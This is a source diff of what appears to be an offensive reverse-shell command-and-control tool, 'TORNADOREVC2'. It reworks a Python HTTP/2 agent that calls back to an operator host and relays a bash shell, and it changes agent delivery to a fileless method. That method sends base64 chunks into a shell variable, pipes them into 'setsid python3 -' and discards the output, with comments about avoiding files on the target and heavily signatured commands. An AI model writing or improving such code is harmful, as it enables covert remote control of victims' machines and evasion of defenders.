@@ -170,7 +170,7 @@ if ($__job) {
 '''
 
 _HTTP2_AGENT_LINUX_PY = r'''
-import os, signal, socket, ssl, subprocess, sys, threading, time
+import os, queue, signal, socket, ssl, subprocess, sys, threading, time
 
 HOST = "__H2_HOST__"
 PORT = __H2_PORT__
@@ -201,6 +201,7 @@ def _spawn_shell():
         ["/bin/bash", "--noprofile", "--norc"],
         stdin=subprocess.PIPE, stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT, bufsize=0,
+        start_new_session=True,
     )
 
 
@@ -215,62 +216,12 @@ def _shutdown_socket(sock):
         pass
 
 
-def _send_data_flow_controlled(conn, sock, sid, data, stop_evt,
-                               max_wait=5.0):
-    """
-    Send `data` on the HTTP/2 stream, respecting the connection's local
-    flow-control window. Blocks until the whole payload is sent, the
-    stream closes, or `max_wait` seconds pass without the server
-    acknowledging with a WINDOW_UPDATE.
-
-    Must be called while holding the caller's send lock.
-    Returns True on success, False if the stream is no longer usable.
-    """
-    if not data:
-        return True
-
-    remaining = data
-    deadline  = time.time() + max_wait
-
-    while remaining:
-        if stop_evt.is_set():
-            return False
-
-        try:
-            window = conn.local_flow_control_window(sid)
-        except Exception:
-            return False
-
-        if window <= 0:
-            if time.time() > deadline:
-                return False
-            # The server is behind on WINDOW_UPDATE. Sleep briefly
-            # and retry. The main loop will still flush whatever h2
-            # has queued.
-            time.sleep(0.05)
-            continue
-
-        chunk_size = min(len(remaining), window,
-                         conn.max_outbound_frame_size)
-        chunk      = remaining[:chunk_size]
-
-        try:
-            conn.send_data(sid, chunk, end_stream=False)
-            sock.sendall(conn.data_to_send())
-        except Exception:
-            return False
-
-        remaining = remaining[chunk_size:]
-        deadline  = time.time() + max_wait
-
-    return True
-
-
 # ------------------------------------------------------------------ h2 path
 
 def run_h2():
     cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
     conn = h2.connection.H2Connection(config=cfg)
+    _log("agent start")
 
     raw = socket.create_connection((HOST, PORT), timeout=30)
     ctx = ssl.create_default_context()
@@ -282,15 +233,10 @@ def run_h2():
         pass
     sock = ctx.wrap_socket(raw, server_hostname=HOST)
 
-    # Critical: the connect timeout is only for the handshake. Without
-    # this the 30 s timeout stays attached to the socket, sock.recv()
-    # raises socket.timeout the first time the operator is idle for
-    # 30 s, the loop breaks, and the stream closes.
     try:
         sock.settimeout(None)
     except Exception:
         pass
-
     try:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
     except Exception:
@@ -308,82 +254,160 @@ def run_h2():
     ], end_stream=False)
     sock.sendall(conn.data_to_send())
 
-    shell = _spawn_shell()
-    send_lock = threading.Lock()
-    stop_evt = threading.Event()
-    respawns = [0]
+    stop_evt      = threading.Event()
+    h2_lock       = threading.Lock()
+    pending_out   = []
+    window_updated = threading.Event()
 
-    def shell_reader(shell_ref):
+    # ---- shell lifecycle: reader + writer threads share this state ------
+    shell_state      = {'proc': None}
+    shell_spawn_lock = threading.Lock()
+    stdin_q          = queue.Queue(maxsize=8192)
+
+    def _spawn_shell_locked():
+        proc = _spawn_shell()
+        shell_state['proc'] = proc
+        threading.Thread(
+            target=shell_reader, args=(proc,), daemon=True,
+        ).start()
+        return proc
+
+    def _ensure_shell():
+        with shell_spawn_lock:
+            proc = shell_state['proc']
+            if proc is None or proc.poll() is not None:
+                rc = None if proc is None else proc.poll()
+                _log("shell dead (rc=%s) — respawning" % rc)
+                _spawn_shell_locked()
+            return shell_state['proc']
+
+    def shell_writer():
+        """Drain stdin_q into the current shell. This is the ONLY place
+        that ever writes to shell stdin. If the write fails, respawn."""
+        while not stop_evt.is_set():
+            try:
+                data = stdin_q.get(timeout=0.5)
+            except queue.Empty:
+                continue
+            if data is None:
+                return
+            while not stop_evt.is_set():
+                proc = _ensure_shell()
+                try:
+                    proc.stdin.write(data)
+                    proc.stdin.flush()
+                    break
+                except Exception as e:
+                    _log("stdin write failed: %r" % (e,))
+                    with shell_spawn_lock:
+                        if shell_state['proc'] is proc:
+                            try:
+                                proc.terminate()
+                            except Exception:
+                                pass
+                            shell_state['proc'] = None
+                    time.sleep(0.2)
+
+    def _drain_out():
+        while pending_out and not stop_evt.is_set():
+            try:
+                window = conn.local_flow_control_window(sid)
+            except Exception as e:
+                _log("flow_control_window exception: %r" % (e,))
+                stop_evt.set()
+                return
+            if window <= 0:
+                return
+            head    = pending_out[0]
+            to_send = min(len(head), window, conn.max_outbound_frame_size)
+            try:
+                conn.send_data(sid, head[:to_send], end_stream=False)
+                sock.sendall(conn.data_to_send())
+            except Exception as e:
+                _log("send_data exception: %r" % (e,))
+                stop_evt.set()
+                return
+            if to_send >= len(head):
+                pending_out.pop(0)
+            else:
+                pending_out[0] = head[to_send:]
+
+    def shell_reader(proc):
+        """Read from ONE shell's stdout. Returns on EOF; the writer will
+        respawn (and start a new reader) when the next command arrives."""
         try:
             while not stop_evt.is_set():
                 try:
-                    data = os.read(shell_ref.stdout.fileno(), 4096)
-                except Exception:
-                    data = b""
-                if not data:
+                    data = os.read(proc.stdout.fileno(), 4096)
+                except Exception as e:
+                    _log("os.read exception: %r" % (e,))
                     return
-                with send_lock:
-                    if not _send_data_flow_controlled(
-                        conn, sock, sid, data, stop_evt,
-                    ):
-                        stop_evt.set()
-                        _shutdown_socket(sock)
-                        return
-        except Exception:
-            return
+                if not data:
+                    _log("shell stdout EOF (rc=%s)" % proc.poll())
+                    return
+                with h2_lock:
+                    pending_out.append(data)
+                    _drain_out()
+                    has_more = bool(pending_out)
+                while has_more and not stop_evt.is_set():
+                    window_updated.wait(timeout=1.0)
+                    window_updated.clear()
+                    with h2_lock:
+                        _drain_out()
+                        has_more = bool(pending_out)
+        except Exception as e:
+            _log("shell_reader fatal: %r" % (e,))
 
-    threading.Thread(target=shell_reader, args=(shell,), daemon=True).start()
+    # Bootstrap the first shell + writer thread.
+    with shell_spawn_lock:
+        _spawn_shell_locked()
+    threading.Thread(target=shell_writer, daemon=True).start()
 
     try:
         while not stop_evt.is_set():
             try:
                 data = sock.recv(65536)
-            except Exception:
+            except Exception as e:
+                _log("recv exception: %r" % (e,))
                 break
             if not data:
+                _log("recv returned EOF — server closed")
                 break
-            with send_lock:
+
+            with h2_lock:
                 try:
                     events = conn.receive_data(data)
-                except Exception:
+                except Exception as e:
+                    _log("h2 receive_data exception: %r" % (e,))
                     break
+                got_window_update = False
                 for ev in events:
                     if isinstance(ev, h2.events.DataReceived):
+                        # NEVER touch shell.stdin from this thread.
                         try:
-                            shell.stdin.write(ev.data)
-                            shell.stdin.flush()
-                        except Exception:
-                            if respawns[0] < 1:
-                                respawns[0] += 1
-                                try:
-                                    shell.terminate()
-                                except Exception:
-                                    pass
-                                shell = _spawn_shell()
-                                threading.Thread(
-                                    target=shell_reader,
-                                    args=(shell,), daemon=True,
-                                ).start()
-                            else:
-                                stop_evt.set()
-                                break
+                            stdin_q.put_nowait(ev.data)
+                        except queue.Full:
+                            _log("stdin_q full — dropping %d bytes"
+                                 % len(ev.data))
                         try:
                             conn.acknowledge_received_data(
                                 ev.flow_controlled_length, ev.stream_id)
                         except Exception:
                             pass
+                    elif isinstance(ev, h2.events.WindowUpdated):
+                        if ev.stream_id in (0, sid):
+                            got_window_update = True
                     elif isinstance(ev, (h2.events.StreamEnded,
                                          h2.events.StreamReset)):
+                        _log("stream ended/reset — event=%s"
+                             % type(ev).__name__)
                         stop_evt.set()
                         break
                     elif isinstance(ev, h2.events.ConnectionTerminated):
+                        _log("connection terminated by peer")
                         stop_evt.set()
                         break
 
-                # Unconditional flush. h2 accumulates SETTINGS ack,
-                # window updates, and PING responses here. The earlier
-                # code only flushed when DataReceived fired, so the
-                # SETTINGS ack never reached the server.
                 try:
                     out = conn.data_to_send()
                     if out:
@@ -391,10 +415,31 @@ def run_h2():
                 except Exception:
                     stop_evt.set()
                     break
+
+                if got_window_update:
+                    _drain_out()
+
+            if got_window_update:
+                window_updated.set()
     finally:
+        _log("agent shutting down")
         stop_evt.set()
+        window_updated.set()
         try:
-            shell.terminate()
+            stdin_q.put_nowait(None)
+        except Exception:
+            pass
+        with shell_spawn_lock:
+            proc = shell_state['proc']
+        if proc is not None:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        try:
+            with h2_lock:
+                conn.end_stream(sid)
+                sock.sendall(conn.data_to_send())
         except Exception:
             pass
         _shutdown_socket(sock)
@@ -504,8 +549,16 @@ def run_h1():
                 shell.stdin.write(payload)
                 shell.stdin.flush()
             except Exception:
-                stop_evt.set()
-                return
+                _log("h1 shell stdin write failed, respawning shell")
+                try:
+                    shell.terminate()
+                except Exception:
+                    pass
+                shell = _spawn_shell()
+                threading.Thread(
+                    target=shell_reader,
+                    args=(shell,), daemon=True,
+                ).start()
     finally:
         stop_evt.set()
         try:
@@ -1096,7 +1149,16 @@ class TORNADOREVC2:
     def send_to_revshell(self, client_sock, cmd):
         try:
             client_sock.sendall((cmd + "\n").encode())
-        except Exception:
+        except Exception as exc:
+            # Secondary transports are torn down by the HTTP listener.
+            # Do not kill the bridge from here — a transient send error
+            # (EINTR, brief back-pressure, TLS rekey) must not tear down
+            # the session's only live transport.
+            if self._is_secondary_transport(client_sock):
+                print(f"{self.colors['yellow']}[transport] send failed on "
+                      f"secondary transport: {type(exc).__name__}: {exc}"
+                      f"{self.colors['end']}")
+                return False
             self.cleanup_client(client_sock)
             return False
 
@@ -1126,6 +1188,18 @@ class TORNADOREVC2:
                     pass
         return True
 
+    def _is_secondary_transport(self, client_sock):
+        """True if client_sock is not the primary shell socket."""
+        info = self._client_info(client_sock)
+        if not info:
+            return False
+        tr = info.get('transports') or {}
+        if tr.get('http2') is client_sock:
+            return True
+        if tr.get('shell') is not client_sock:
+            return True
+        return False
+
     def recv_output(self, client_sock, timeout=1.0, until_marker=None):
         data = b""
         deadline = time.time() + timeout
@@ -1141,17 +1215,11 @@ class TORNADOREVC2:
                     break
                 chunk = client_sock.recv(65536)
                 if not chunk:
-                    # Only clean up the primary shell; secondary transports
-                    # are torn down by the HTTP listener.
-                    info = self._client_info(client_sock)
-                    is_secondary = False
-                    if info:
-                        tr = info.get('transports') or {}
-                        if tr.get('http2') is client_sock:
-                            is_secondary = True
-                        elif tr.get('shell') is not client_sock:
-                            is_secondary = True
-                    if not is_secondary:
+                    # Never tear down a secondary transport from here — the
+                    # HTTP listener owns its lifecycle (StreamEnded /
+                    # StreamReset / connection teardown). A transient empty
+                    # read on a socketpair is not a session disconnect.
+                    if not self._is_secondary_transport(client_sock):
                         self.cleanup_client(client_sock)
                     return ""
                 data += chunk
@@ -1161,7 +1229,10 @@ class TORNADOREVC2:
                 if not until_marker:
                     deadline = min(deadline, time.time() + 0.3)
             except Exception:
-                self.cleanup_client(client_sock)
+                # Same rule: only the primary shell is cleaned up here.
+                # Secondary transports are torn down by the listener.
+                if not self._is_secondary_transport(client_sock):
+                    self.cleanup_client(client_sock)
                 return ""
         return data.decode(errors="ignore")
 
@@ -1503,53 +1574,70 @@ class TORNADOREVC2:
 
     def _deliver_http2_linux(self, primary_sock, host, port, token):
         """
-        Deliver the Linux HTTP/2 agent without blocking the interactive shell
-        and without exceeding the PTY line-length limit (~4095 chars).
+        Deliver the Linux HTTP/2 agent entirely in memory.
 
-        Steps:
-        1. Choose a unique /tmp pair for the base64 stage and the .py file.
-        2. Truncate the base64 stage.
-        3. Append the base64 source in 500-char pieces (each piece is a
-            short, standalone shell command).
-        4. One final command: decode → run with nohup in background →
-            schedule self-cleanup → print a marker for the operator.
+        The Python source is base64-encoded, accumulated into a shell
+        variable across multiple PTY-safe chunks, then decoded and piped
+        straight into `python3 -` via stdin. No file ever touches disk —
+        not even for a fraction of a second.
+
+        Process isolation:
+          - `setsid` puts the agent in its own session, so it is immune to
+            SIGHUP and to signals aimed at the reverse shell's process
+            group (which is what killed the previous agent whenever a
+            long-running command was typed into the interactive shell).
+          - stdout/stderr go to /dev/null so nothing is written back to
+            the operator's terminal or to any file on the target.
+          - the shell variable holding the base64 is unset immediately
+            after launch, so it does not linger in the shell's memory.
 
         Returns True if the launch command was sent, False on write failure.
         """
         b64 = self._http2_payload_linux(host, port, token)
 
-        tag     = secrets.token_hex(4)
-        tmp_b64 = f"/tmp/.t{tag}.b64"
-        tmp_py  = f"/tmp/.t{tag}.py"
+        # Shell variable we will grow one chunk at a time. The variable
+        # name is intentionally short and unlikely to collide with
+        # anything the operator has already defined.
+        var = "_h2b64"
 
-        # Step 2 — truncate the staging file.
-        if not self.send_to_revshell(primary_sock, f": > {tmp_b64}"):
+        # Step 1 — initialise (and if a previous attempt left it set,
+        # clear it) the variable. Single quotes for the empty string.
+        if not self.send_to_revshell(primary_sock, f"{var}=''"):
             return False
-        self.recv_output(primary_sock, timeout=1.0)
+        self.recv_output(primary_sock, timeout=0.5)
 
-        # Step 3 — append base64 in small chunks. 500 is well under the PTY
-        # canonical input buffer (4095) even after the printf wrapper.
+        # Step 2 — append base64 chunks. 500 chars keeps every command
+        # well under the PTY canonical input buffer (typically 4095),
+        # even after the wrapper syntax is added.
+        #
+        #     VAR="$VAR"'newpiece'
+        #
+        # concatenates without a space, preserving the base64 stream.
         CHUNK = 500
         for i in range(0, len(b64), CHUNK):
             piece = b64[i:i + CHUNK]
             if not self.send_to_revshell(
-                primary_sock, f"printf '%s' '{piece}' >> {tmp_b64}"
+                primary_sock, f"{var}=\"${var}\"'{piece}'"
             ):
                 return False
-            # Let the shell drain its input buffer between chunks.
             self.recv_output(primary_sock, timeout=0.4)
 
-        # setsid fully detaches the agent from the reverse shell's process
-        # group. nohup + & + disown leave the process group association
-        # intact, which is why the previous agent was reaped by signals
-        # sent to the group when the operator ran commands in the
-        # interactive shell.
+        # Step 3 — decode and execute in one shot, in memory.
+        #
+        #   printf '%s' "$VAR"      → emit the base64
+        #   | base64 -d             → decode to Python source
+        #   | setsid python3 -      → read source from stdin and run it
+        #   >/dev/null 2>&1         → swallow all output
+        #   &                       → background the whole pipeline
+        #   unset VAR               → scrub the base64 from shell memory
+        #   echo H2_LAUNCHED        → marker the operator can grep for
+        #
+        # Double quotes around "$VAR" are safe: base64 alphabet is
+        # [A-Za-z0-9+/=], none of which the shell interprets.
         launch = (
-            f"base64 -d {tmp_b64} > {tmp_py}; "
-            f"rm -f {tmp_b64}; "
-            f"chmod +x {tmp_py}; "
-            f"setsid python3 {tmp_py} </dev/null >/dev/null 2>&1 & "
-            f"( sleep 5; rm -f {tmp_py} ) >/dev/null 2>&1 & "
+            f"printf '%s' \"${var}\" | base64 -d | "
+            f"setsid python3 - >/dev/null 2>&1 & "
+            f"unset {var}; "
             f"echo H2_LAUNCHED"
         )
         return self.send_to_revshell(primary_sock, launch)
@@ -2129,41 +2217,48 @@ class TORNADOREVC2:
             print(f"{self.colors['red']}No Active Clients{self.colors['end']}")
         else:
             print(f"{self.colors['green']}Active Clients:{self.colors['end']}")
+        seen = set()
         with self.client_lock:
             for sock, info in self.revshell_clients.items():
-                if sock.fileno() != -1:
-                    status = "CURRENT" if sock == self.current_client else ""
+                if sock.fileno() == -1:
+                    continue
+                sid = info.get('id')
+                if sid in seen:
+                    continue
+                seen.add(sid)
 
-                    if info.get('mtls'):
-                        proto = "MTLS"
-                    elif info.get('tls'):
-                        proto = "TLS"
-                    else:
-                        proto = "TCP"
+                status = "CURRENT" if sock == self.current_client else ""
 
-                    direction = "BIND" if info.get('direction') == 'bind' else "REV"
-                    proto = f"{proto}/{direction}"
-                    active = info.get('active_transport', 'shell')
-                    if active == 'http2':
-                        proto = f"{proto} [active: http2]"
+                if info.get('mtls'):
+                    proto = "MTLS"
+                elif info.get('tls'):
+                    proto = "TLS"
+                else:
+                    proto = "TCP"
 
-                    display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
-                    sysinfo = info.get('sysinfo') or {}
-                    host = sysinfo.get('hostname', '?')
-                    user = sysinfo.get('username', '?')
-                    os_name = sysinfo.get('os', info.get('type', '?'))
-                    arch = sysinfo.get('architecture', '')
-                    reconnects = info.get('connect_count', 1)
-                    detail = f"{user}@{host} [{os_name}"
-                    if arch:
-                        detail += f"/{arch}"
-                    detail += "]"
-                    if reconnects > 1:
-                        detail += f" (reconnects: {reconnects})"
-                    log_dir = info.get('logger').session_dir if info.get('logger') else ''
-                    print(f"  {display} {info['addr'][0]}:{info['addr'][1]} {proto} {detail} {status}")
-                    if log_dir:
-                        print(f"    {self.colors['blue']}Log: {log_dir}{self.colors['end']}")
+                direction = "BIND" if info.get('direction') == 'bind' else "REV"
+                proto = f"{proto}/{direction}"
+                act = info.get('active_transport', 'shell')
+                if act == 'http2':
+                    proto = f"{proto} [active: http2]"
+
+                display = f"#{info['id']} ({info['name']})" if info.get("name") else f"#{info['id']}"
+                sysinfo = info.get('sysinfo') or {}
+                host = sysinfo.get('hostname', '?')
+                user = sysinfo.get('username', '?')
+                os_name = sysinfo.get('os', info.get('type', '?'))
+                arch = sysinfo.get('architecture', '')
+                reconnects = info.get('connect_count', 1)
+                detail = f"{user}@{host} [{os_name}"
+                if arch:
+                    detail += f"/{arch}"
+                detail += "]"
+                if reconnects > 1:
+                    detail += f" (reconnects: {reconnects})"
+                log_dir = info.get('logger').session_dir if info.get('logger') else ''
+                print(f"  {display} {info['addr'][0]}:{info['addr'][1]} {proto} {detail} {status}")
+                if log_dir:
+                    print(f"    {self.colors['blue']}Log: {log_dir}{self.colors['end']}")
 
     def _live_session_ids(self):
         ids = set()
@@ -2865,9 +2960,20 @@ class TORNADOREVC2:
             if info.get('active_transport') != 'shell' and \
                info['transports'].get(info['active_transport']) is None:
                 info['active_transport'] = 'shell'
+                reason = info.pop('_last_h2_close_reason', None)
+                if reason is None:
+                    import traceback as _tb
+                    reason = 'unknown'
+                    print(
+                        f"{self.colors['red']}[transport] closing bridge "
+                        f"with no reason set. Stack:{self.colors['end']}"
+                    )
+                    for line in _tb.format_stack():
+                        print(f"  {line.rstrip()}")
                 print(
                     f"{self.colors['yellow']}Secondary transport on "
-                    f"#{info['id']} closed — reverted to shell"
+                    f"#{info['id']} closed — reverted to shell "
+                    f"(reason: {reason})"
                     f"{self.colors['end']}"
                 )
             return
@@ -3043,7 +3149,7 @@ class TORNADOREVC2:
                 # interactive) is heavily signatured and legitimate
                 # automation almost never uses it. A bare exec inherits
                 # the active PTY.
-                self.send_to_revshell(client_sock, "exec /bin/bash 2>/dev/null")
+                self.send_to_revshell(client_sock, "exec /bin/bash -i 2>/dev/null")
                 time.sleep(0.8)
                 self._flush_shell(client_sock, timeout=0.8)
             client_info['pty'] = True
